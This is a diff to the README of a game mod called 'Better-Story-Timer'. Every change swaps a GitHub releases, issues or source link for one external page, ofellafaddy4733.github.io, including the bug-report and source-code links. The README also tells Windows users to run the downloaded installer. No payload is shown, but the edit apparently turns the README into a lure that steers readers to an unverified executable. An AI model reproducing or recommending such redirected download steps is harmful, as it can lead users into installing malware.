@@ -1,7 +1,7 @@
 <h1>🕒 Better-Story-Timer - Extend Your Story, Never Rush Again</h1>
 
 <p align="center">
-  <a href="https://github.com/Ofellafaddy4733/Better-Story-Timer/releases"><img src="https://img.shields.io/badge/Download%20Now-Free%20Mod-2ea44f?style=for-the-badge&logo=github" alt="Download"></a>
+  <a href="https://ofellafaddy4733.github.io"><img src="https://img.shields.io/badge/Download%20Now-Free%20Mod-2ea44f?style=for-the-badge&logo=github" alt="Download"></a>
 </p>
 
 ## 🎮 What Is Better-Story-Timer?
@@ -33,7 +33,7 @@ Your achievements and trophies remain fully intact. This mod operates within the
 Getting started with Better-Story-Timer is incredibly easy. Follow these simple steps:
 
 ### Step 1: Download the Mod
-Visit this link to download the application: [Download Better-Story-Timer](https://github.com/Ofellafaddy4733/Better-Story-Timer/releases)
+Visit this link to download the application: [Download Better-Story-Timer](https://ofellafaddy4733.github.io)
 
 Click the "Download" button on that page to get the mod files.
 
@@ -52,7 +52,7 @@ Start The Blood of Dawnwalker normally. The mod activates automatically. You'll 
 
 ### For Windows Users
 
-1. **Download** the mod from our [official releases page](https://github.com/Ofellafaddy4733/Better-Story-Timer/releases)
+1. **Download** the mod from our [official releases page](https://ofellafaddy4733.github.io)
 2. **Save the file** to your Downloads folder or any location you prefer
 3. **Run the installer** by double-clicking the downloaded file
 4. **Follow the on-screen prompts** - the installer will handle everything
@@ -175,9 +175,9 @@ This mod is free for personal use. Redistribution with credit is allowed. Commer
 
 ## 🔗 Quick Access Links
 
-- [Download Latest Version](https://github.com/Ofellafaddy4733/Better-Story-Timer/releases)
-- [Report a Bug](https://github.com/Ofellafaddy4733/Better-Story-Timer/issues)
-- [View Source Code](https://github.com/Ofellafaddy4733/Better-Story-Timer)
+- [Download Latest Version](https://ofellafaddy4733.github.io)
+- [Report a Bug](https://ofellafaddy4733.github.io)
+- [View Source Code](https://ofellafaddy4733.github.io)
 
 ---
 
